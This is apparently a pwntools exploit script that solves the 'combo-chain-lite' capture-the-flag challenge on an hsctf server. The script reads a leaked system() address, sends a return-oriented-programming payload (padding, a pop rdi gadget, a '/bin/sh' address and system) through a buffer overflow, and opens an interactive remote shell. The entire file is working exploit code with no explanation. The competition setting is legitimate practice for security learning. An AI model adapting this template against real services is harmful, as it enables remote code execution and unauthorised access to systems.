from pwn import *

binsh = p64(0x402051)
poprdi = p64(0x0000000000401273)

r = remote('pwn.hsctf.com', 3131)
# r = gdb.debug('./combo-chain-lite')

r.recvuntil('computer: ')
addr = r.recvuntil('\n')
print(addr[:-1])
system = p64(int(addr[:-1], 16))

payload = b''
payload += b'A' * 8
payload += b'B' * 8
payload += poprdi
payload += binsh
payload += system

r.recvuntil(': ')
r.sendline(payload)
r.interactive()

